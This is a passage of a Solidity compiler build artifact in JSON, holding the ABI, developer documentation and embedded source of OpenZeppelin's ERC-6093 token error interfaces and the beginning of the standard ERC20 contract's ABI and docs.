ils":"Standard ERC20 Errors Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.","errors":{"ERC20InsufficientAllowance(address,uint256,uint256)":[{"details":"Indicates a failure with the `spender`’s `allowance`. Used in transfers.","params":{"allowance":"Amount of tokens a `spender` is allowed to operate with.","needed":"Minimum amount required to perform a transfer.","spender":"Address that may be allowed to operate on tokens without being their owner."}}],"ERC20InsufficientBalance(address,uint256,uint256)":[{"details":"Indicates an error related to the current `balance` of a `sender`. Used in transfers.","params":{"balance":"Current balance for the interacting account.","needed":"Minimum amount required to perform a transfer.","sender":"Address whose tokens are being transferred."}}],"ERC20InvalidApprover(address)":[{"details":"Indicates a failure with the `approver` of a token to be approved. Used in approvals.","params":{"approver":"Address initiating an approval operation."}}],"ERC20InvalidReceiver(address)":[{"details":"Indicates a failure with the token `receiver`. Used in transfers.","params":{"receiver":"Address to which tokens are being transferred."}}],"ERC20InvalidSender(address)":[{"details":"Indicates a failure with the token `sender`. Used in transfers.","params":{"sender":"Address whose tokens are being transferred."}}],"ERC20InvalidSpender(address)":[{"details":"Indicates a failure with the `spender` to be approved. Used in approvals.","params":{"spender":"Address that may be allowed to operate on tokens without being their owner."}}]},"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.21+commit.d9974bed\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"allowance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERC20InsufficientAllowance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERC20InsufficientBalance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approver\",\"type\":\"address\"}],\"name\":\"ERC20InvalidApprover\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"ERC20InvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ERC20InvalidSender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"ERC20InvalidSpender\",\"type\":\"error\"}],\"devdoc\":{\"details\":\"Standard ERC20 Errors Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\",\"errors\":{\"ERC20InsufficientAllowance(address,uint256,uint256)\":[{\"details\":\"Indicates a failure with the `spender`\\u2019s `allowance`. Used in transfers.\",\"params\":{\"allowance\":\"Amount of tokens a `spender` is allowed to operate with.\",\"needed\":\"Minimum amount required to perform a transfer.\",\"spender\":\"Address that may be allowed to operate on tokens without being their owner.\"}}],\"ERC20InsufficientBalance(address,uint256,uint256)\":[{\"details\":\"Indicates an error related to the current `balance` of a `sender`. Used in transfers.\",\"params\":{\"balance\":\"Current balance for the interacting account.\",\"needed\":\"Minimum amount required to perform a transfer.\",\"sender\":\"Address whose tokens are being transferred.\"}}],\"ERC20InvalidApprover(address)\":[{\"details\":\"Indicates a failure with the `approver` of a token to be approved. Used in approvals.\",\"params\":{\"approver\":\"Address initiating an approval operation.\"}}],\"ERC20InvalidReceiver(address)\":[{\"details\":\"Indicates a failure with the token `receiver`. Used in transfers.\",\"params\":{\"receiver\":\"Address to which tokens are being transferred.\"}}],\"ERC20InvalidSender(address)\":[{\"details\":\"Indicates a failure with the token `sender`. Used in transfers.\",\"params\":{\"sender\":\"Address whose tokens are being transferred.\"}}],\"ERC20InvalidSpender(address)\":[{\"details\":\"Indicates a failure with the `spender` to be approved. Used in approvals.\",\"params\":{\"spender\":\"Address that may be allowed to operate on tokens without being their owner.\"}}]},\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\":\"IERC20Errors\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Standard ERC20 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\\n */\\ninterface IERC20Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC20InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC20InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender`\\u2019s `allowance`. Used in transfers.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC20InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC20InvalidSpender(address spender);\\n}\\n\\n/**\\n * @dev Standard ERC721 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\\n */\\ninterface IERC721Errors {\\n    /**\\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\\n     * Used in balance queries.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721InvalidOwner(address owner);\\n\\n    /**\\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721NonexistentToken(uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param tokenId Identifier number of a token.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC721InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC721InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC721InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC721InvalidOperator(address operator);\\n}\\n\\n/**\\n * @dev Standard ERC1155 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.\\n */\\ninterface IERC1155Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC1155InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC1155InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC1155MissingApprovalForAll(address operator, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC1155InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC1155InvalidOperator(address operator);\\n\\n    /**\\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\\n     * Used in batch transfers.\\n     * @param idsLength Length of the array of token identifiers\\n     * @param valuesLength Length of the array of token amounts\\n     */\\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\\n}\\n\",\"keccak256\":\"0x60c65f701957fdd6faea1acb0bb45825791d473693ed9ecb34726fdfaa849dd7\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}},"IERC721Errors":{"abi":[{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"address","name":"owner","type":"address"}],"name":"ERC721IncorrectOwner","type":"error"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ERC721InsufficientApproval","type":"error"},{"inputs":[{"internalType":"address","name":"approver","type":"address"}],"name":"ERC721InvalidApprover","type":"error"},{"inputs":[{"internalType":"address","name":"operator","type":"address"}],"name":"ERC721InvalidOperator","type":"error"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"ERC721InvalidOwner","type":"error"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"}],"name":"ERC721InvalidReceiver","type":"error"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"ERC721InvalidSender","type":"error"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ERC721NonexistentToken","type":"error"}],"devdoc":{"details":"Standard ERC721 Errors Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.","errors":{"ERC721IncorrectOwner(address,uint256,address)":[{"details":"Indicates an error related to the ownership over a particular token. Used in transfers.","params":{"owner":"Address of the current owner of a token.","sender":"Address whose tokens are being transferred.","tokenId":"Identifier number of a token."}}],"ERC721InsufficientApproval(address,uint256)":[{"details":"Indicates a failure with the `operator`’s approval. Used in transfers.","params":{"operator":"Address that may be allowed to operate on tokens without being their owner.","tokenId":"Identifier number of a token."}}],"ERC721InvalidApprover(address)":[{"details":"Indicates a failure with the `approver` of a token to be approved. Used in approvals.","params":{"approver":"Address initiating an approval operation."}}],"ERC721InvalidOperator(address)":[{"details":"Indicates a failure with the `operator` to be approved. Used in approvals.","params":{"operator":"Address that may be allowed to operate on tokens without being their owner."}}],"ERC721InvalidOwner(address)":[{"details":"Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20. Used in balance queries.","params":{"owner":"Address of the current owner of a token."}}],"ERC721InvalidReceiver(address)":[{"details":"Indicates a failure with the token `receiver`. Used in transfers.","params":{"receiver":"Address to which tokens are being transferred."}}],"ERC721InvalidSender(address)":[{"details":"Indicates a failure with the token `sender`. Used in transfers.","params":{"sender":"Address whose tokens are being transferred."}}],"ERC721NonexistentToken(uint256)":[{"details":"Indicates a `tokenId` whose `owner` is the zero address.","params":{"tokenId":"Identifier number of a token."}}]},"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.21+commit.d9974bed\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"ERC721IncorrectOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"ERC721InsufficientApproval\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approver\",\"type\":\"address\"}],\"name\":\"ERC721InvalidApprover\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"}],\"name\":\"ERC721InvalidOperator\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"ERC721InvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"ERC721InvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ERC721InvalidSender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"ERC721NonexistentToken\",\"type\":\"error\"}],\"devdoc\":{\"details\":\"Standard ERC721 Errors Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\",\"errors\":{\"ERC721IncorrectOwner(address,uint256,address)\":[{\"details\":\"Indicates an error related to the ownership over a particular token. Used in transfers.\",\"params\":{\"owner\":\"Address of the current owner of a token.\",\"sender\":\"Address whose tokens are being transferred.\",\"tokenId\":\"Identifier number of a token.\"}}],\"ERC721InsufficientApproval(address,uint256)\":[{\"details\":\"Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\",\"params\":{\"operator\":\"Address that may be allowed to operate on tokens without being their owner.\",\"tokenId\":\"Identifier number of a token.\"}}],\"ERC721InvalidApprover(address)\":[{\"details\":\"Indicates a failure with the `approver` of a token to be approved. Used in approvals.\",\"params\":{\"approver\":\"Address initiating an approval operation.\"}}],\"ERC721InvalidOperator(address)\":[{\"details\":\"Indicates a failure with the `operator` to be approved. Used in approvals.\",\"params\":{\"operator\":\"Address that may be allowed to operate on tokens without being their owner.\"}}],\"ERC721InvalidOwner(address)\":[{\"details\":\"Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20. Used in balance queries.\",\"params\":{\"owner\":\"Address of the current owner of a token.\"}}],\"ERC721InvalidReceiver(address)\":[{\"details\":\"Indicates a failure with the token `receiver`. Used in transfers.\",\"params\":{\"receiver\":\"Address to which tokens are being transferred.\"}}],\"ERC721InvalidSender(address)\":[{\"details\":\"Indicates a failure with the token `sender`. Used in transfers.\",\"params\":{\"sender\":\"Address whose tokens are being transferred.\"}}],\"ERC721NonexistentToken(uint256)\":[{\"details\":\"Indicates a `tokenId` whose `owner` is the zero address.\",\"params\":{\"tokenId\":\"Identifier number of a token.\"}}]},\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\":\"IERC721Errors\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Standard ERC20 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\\n */\\ninterface IERC20Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC20InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC20InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender`\\u2019s `allowance`. Used in transfers.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC20InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC20InvalidSpender(address spender);\\n}\\n\\n/**\\n * @dev Standard ERC721 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\\n */\\ninterface IERC721Errors {\\n    /**\\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\\n     * Used in balance queries.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721InvalidOwner(address owner);\\n\\n    /**\\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721NonexistentToken(uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param tokenId Identifier number of a token.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC721InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC721InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC721InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC721InvalidOperator(address operator);\\n}\\n\\n/**\\n * @dev Standard ERC1155 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.\\n */\\ninterface IERC1155Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC1155InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC1155InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC1155MissingApprovalForAll(address operator, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC1155InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC1155InvalidOperator(address operator);\\n\\n    /**\\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\\n     * Used in batch transfers.\\n     * @param idsLength Length of the array of token identifiers\\n     * @param valuesLength Length of the array of token amounts\\n     */\\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\\n}\\n\",\"keccak256\":\"0x60c65f701957fdd6faea1acb0bb45825791d473693ed9ecb34726fdfaa849dd7\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/token/ERC20/ERC20.sol":{"ERC20":{"abi":[{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"allowance","type":"uint256"},{"internalType":"uint256","name":"needed","type":"uint256"}],"name":"ERC20InsufficientAllowance","type":"error"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"uint256","name":"balance","type":"uint256"},{"internalType":"uint256","name":"needed","type":"uint256"}],"name":"ERC20InsufficientBalance","type":"error"},{"inputs":[{"internalType":"address","name":"approver","type":"address"}],"name":"ERC20InvalidApprover","type":"error"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"}],"name":"ERC20InvalidReceiver","type":"error"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"ERC20InvalidSender","type":"error"},{"inputs":[{"internalType":"address","name":"spender","type":"address"}],"name":"ERC20InvalidSpender","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"details":"Implementation of the {IERC20} interface. This implementation is agnostic to the way tokens are created. This means that a supply mechanism has to be added in a derived contract using {_mint}. TIP: For a detailed writeup see our guide https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How to implement supply mechanisms]. The default value of {decimals} is 18. To change this, you should override this function so it returns a different value. We have followed general OpenZeppelin Contracts guidelines: functions revert instead returning `false` on failure. This behavior is nonetheless conventional and does not conflict with the expectations of ERC20 applications. Additionally, an {Approval} event is emitted on calls to {transferFrom}. This allows applications to reconstruct the allowance for all accounts just by listening to said events. Other implementations of the EIP may not emit these events, as it isn't required by the specification.","errors":{"ERC20InsufficientAllowance(address,uint256,uint256)":[{"details":"Indicates a failure with the `spender`’s `allowance`. Used in transfers.","params":{"allowance":"Amount of tokens a `spender` is allowed to operate with.","needed":"Minimum amount required to perform a transfer.","spender":"Address that may be allowed to operate on tokens without being their owner."}}],"ERC20InsufficientBalance(address,uint256,uint256)":[{"details":"Indicates an error related to the current `balance` of a `sender`. Used in transfers.","params":{"balance":"Current balance for the interacting account.","needed":"Minimum amount required to perform a transfer.","sender":"Address whose tokens are being transferred."}}],"ERC20InvalidApprover(address)":[{"details":"Indicates a failure with the `approver` of a token to be approved. Used in approvals.","params":{"approver":"Address initiating an approval operation."}}],"ERC20InvalidReceiver(address)":[{"details":"Indicates a failure with the token `receiver`. Used in transfers.","params":{"receiver":"Address to which tokens are being transferred."}}],"ERC20InvalidSender(address)":[{"details":"Indicates a failure with the token `sender`. Used in transfers.","params":{"sender":"Address whose tokens are being transferred."}}],"ERC20InvalidSpender(address)":[{"details":"Indicates a failure with the `spender` to be approved. Used in approvals.","params":{"spender":"Address that may be allowed to operate on tokens without being their owner."}}]},"events":{"Approval(address,address,uint256)":{"details":"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."},"Transfer(address,address,uint256)":{"details":"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."}},"kind":"dev","methods":{"allowance(address,address)":{"details":"See {IERC20-allowance}."},"approve(address,uint256)":{"details":"See {IERC20-approve}. NOTE: If `value` is the maximum `uint256`, the allowance is not updated on `transferFrom`. This is semantically equivalent to an infinite approval. Requirements: - `spender` cannot be the zero address."},"balanceOf(address)":{"details":"See {IERC20-balanceOf}."},"constructor":{"details":"Sets the values for {name} and {symbol}. All two of these values are immutable: they can only be set once during construction."},"decimals()":{"details":"Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5.05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the default value returned by this function, unless it's overridden. NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."},"name()":{"details":"Returns the name of the token."},"symbol()":{"details":"Returns the symbol of the token, usually a shorter version of the name."},"totalSupply()":{"details":"See {IERC20-totalSupply}."},"transfer(address,uint256)":{"details":"See {IERC20-transfer}. Requirements: - `to` cannot be the zero address. - the caller must have a balance of at least `value`."},"transferFrom(address,address,uint256)":{"details":"See {IERC20-transferFrom}. Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}. NOTE: Does not update the allowance if the current allowance is the maximum `uint256`. Requirements: - `from` and `to` cannot be the zero address. - `from` must have a balance of at least `value`. - the caller must have allowance for ``from``'s tokens of at least 